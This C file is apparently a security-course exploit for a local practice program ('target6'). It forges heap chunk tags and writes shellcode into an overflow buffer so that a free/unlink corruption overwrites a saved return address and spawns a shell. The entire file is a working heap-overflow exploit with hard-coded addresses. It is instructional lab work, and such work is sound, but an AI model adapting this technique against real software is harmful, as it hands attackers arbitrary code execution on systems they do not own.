#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define NOP 0x90
#define SHELL_SIZE 45
#define BUFSIZE 81
#define TARGET_ADDR 0x40a4fe68

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[1] = "hi there"; 
  char buf_overflow[BUFSIZE];
  int i;
  memset(buf_overflow, '\x01', BUFSIZE);
 
  //&p: 0x0104ee28
  //&q: 0x0104ee78

  //create 2 fake tags, one at p, the other right before q 
  char fake_prev_1[] = "\x24\xee\x04\x01";  //point to real p.tag.next 
  char fake_prev[] = "\x28\xee\x04\x01";
  char fake_next[] = "\x68\xfe\xa4\x40"; //rip return address
 
  memcpy(&buf_overflow[0],fake_prev_1, 4);//connect the fake tag p with real p tag
  //fake_next_1 = \x01\x01\x01\x01
  
  memcpy(&buf_overflow[8], shellcode, SHELL_SIZE);
  
  memcpy(&buf_overflow[72], fake_prev, 4);
  memcpy(&buf_overflow[76], fake_next, 4);
 

  buf_overflow[BUFSIZE-1] = '\0';
  
  args[0] = TARGET; 
  args[1] = buf_overflow; 
  args[2] = NULL;
  
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
